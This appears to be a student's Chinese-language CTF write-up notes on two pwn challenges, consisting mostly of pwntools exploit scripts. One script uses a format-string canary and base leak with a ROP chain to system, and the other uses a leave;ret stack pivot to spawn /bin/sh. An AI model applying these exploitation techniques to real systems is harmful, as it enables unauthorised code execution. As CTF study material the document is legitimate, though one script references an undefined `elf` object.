2.[深育杯 2021]find_flag

进入程序，发现格式化字符串漏洞，随后找到canary地址并且计算基地址，后面为啥加指针没理解，只记住;脚本：
from pwn import*

p=process(“./fg”)
#p=remote(“node4.anna.nssctf.cn”,24711)
payload1=’%17$paaa%19$p’
p.recvuntil(b’name? ‘)
payload1 = b’%17$p—%19$p’
p.sendline(payload1)
p.recvuntil(b’you, ‘)

canary = int(p.recv(18), 16)
print(hex(canary))

p.recvuntil(b’—‘)
base = int(p.recv(14), 16)
print(hex(base))

Base = base - 0x146F

system = Base + elf.sym[‘system’]
catflag = Base + 0x2004
rdi = Base + 0x14E3
ret = Base + 0x101A

payload = b’a’*0x38 + p64(canary) + b’a’*8 + p64(ret) + p64(rdi) + p64(catflag) + p64(system)
p.recvuntil(b’else? ‘)
p.sendline(payload)
p.recv()
p.interactive()

3.[CISCN 2019东南]PWN2

检查完保护并且打开ida,然后分析，因为read 函数 限制了输入长度不超过 0x30 个字节 ，也就意味着 我们输入的数据 只能覆盖到 ret_addr 。随后进行栈迁移。找到leave地址，后面的还在积极理解脚本：
from pwn import *
#p=process(‘./p2’)
p = remote(‘node5.anna.nssctf.cn’,26611)
leave_ret = 0x08048562
system_addr = 0x08048400
leak = b’a’*(0x27) + b’B’

p.recvuntil(“name?”)

p.send(leak)
p.recvuntil(b’B’)
old_edp = u32(p.recv(4))
print(hex(old_edp))

payload = b’a’*4 + p32(system_addr) + b’a’*4 + p32(old_edp - 0x28) + b’/bin/sh\x00’

payload = payload.ljust(0x28, b’\x00’)
payload += p32(old_edp - 0x38) + p32(leave_ret)
p.recvuntil(‘\n’)
p.send(payload)

p.interactive()
